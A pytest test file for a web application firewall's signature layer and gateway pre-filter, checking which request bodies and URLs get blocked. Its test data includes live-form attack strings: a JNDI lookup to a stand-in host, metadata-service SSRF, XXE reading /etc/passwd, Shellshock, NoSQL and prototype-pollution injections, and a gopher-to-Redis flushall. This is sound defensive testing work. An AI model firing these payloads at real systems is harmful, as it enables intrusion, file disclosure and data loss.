"""The signature layer inside text_service (bodies + request targets) and the gateway's cheap pre-filter.

No model is loaded here: signatures are regex-only, so a block must come from them and nothing else.
"""
import os
import sys

import pytest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from ml.waf import target as T  # noqa: E402
from text_service import main as svc  # noqa: E402

JNDI = "${jndi:ldap://evil.example/a}"


def blocked(v):
    return str(v["status"]).lower().endswith("block")


@pytest.fixture(autouse=True)
def _env(monkeypatch):
    monkeypatch.delenv("WAF_SIGNATURES", raising=False)
    monkeypatch.setattr(svc, "waf_classifier", None)
    monkeypatch.setattr(svc, "router_classifier", None)


@pytest.mark.parametrize("body", [
    JNDI, "x=" + JNDI, '{"u": "%s"}' % JNDI, "url=http://169.254.169.254/latest/meta-data/", "lang=en%0d%0aSet-Cookie:%20a=b",
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "username[$ne]=x&password[$ne]=x",
    '{"__proto__": {"admin": true}}', "() { :; }; /bin/cat /etc/passwd", "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
])
def test_outbound_attack_bodies_are_blocked_by_the_signature_module(body):
    v = svc._analyze_sync(body, False, "outbound")
    assert blocked(v) and "web_signature" in v["reason"], v["reason"]


def test_inbound_bodies_are_not_judged_by_signatures():
    v = svc._analyze_sync(JNDI, False, "inbound")
    assert "web_signature" not in v["reason"]


def test_llm_api_traffic_may_discuss_attacks():
    """A user asking an LLM what ${jndi:...} does is writing about an attack, not mounting one."""
    v = svc._analyze_sync('{"messages":[{"role":"user","content":"What does %s do?"}]}' % JNDI, True, "outbound")
    assert "web_signature" not in v["reason"]


def test_policy_off_and_advisory_do_not_block(monkeypatch):
    monkeypatch.setenv("WAF_SIGNATURES", "off")
    assert not blocked(svc._analyze_sync(JNDI, False, "outbound"))
    monkeypatch.setenv("WAF_SIGNATURES", "advisory")
    assert not blocked(svc._analyze_sync(JNDI, False, "outbound"))


@pytest.mark.parametrize("body", ["hello world", "q=best+pizza", '{"filter": {"qty": {"$gt": 0}}}', "http://localhost:3000/api",
                                  "echo ${HOME}", '<!DOCTYPE html><html></html>', "Location: Paris"])
def test_ordinary_bodies_are_untouched(body):
    assert not blocked(svc._analyze_sync(body, False, "outbound"))


@pytest.mark.parametrize("target", [
    "/x?u=http://169.254.169.254/latest/meta-data/", "/x?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D", "/x?u=gopher://127.0.0.1:6379/_flushall",
    "/x?lang=en%0d%0aSet-Cookie:%20a=b", "/x?user[$ne]=1&pass[$ne]=1", "/x?a[__proto__][admin]=1",
])
def test_request_targets_with_these_attacks_are_blocked(target):
    v = svc._analyze_target(target)
    assert blocked(v) and "web_signature" in v["reason"], v["reason"]


@pytest.mark.parametrize("target", ["/api/items?page=2&sort=name", "/search?q=best+pizza", "/p?redirect=https://example.com/home", "/p?next=http://localhost:3000/"])
def test_ordinary_request_targets_are_not_blocked_by_signatures(target):
    assert "web_signature" not in svc._analyze_target(target)["reason"]


@pytest.mark.parametrize("target", ["/x?u=gopher://127.0.0.1:6379/_x", "/x?q=%24%7Bjndi%3Aldap%3A%2F%2Fe.example%2Fa%7D", "/x?u=http://169.254.169.254/"])
def test_gateway_prefilter_forwards_signature_targets(target):
    assert T.is_interesting(target)


def test_gateway_prefilter_still_ignores_ordinary_targets():
    assert not T.is_interesting("/api/items?page=2&sort=name")
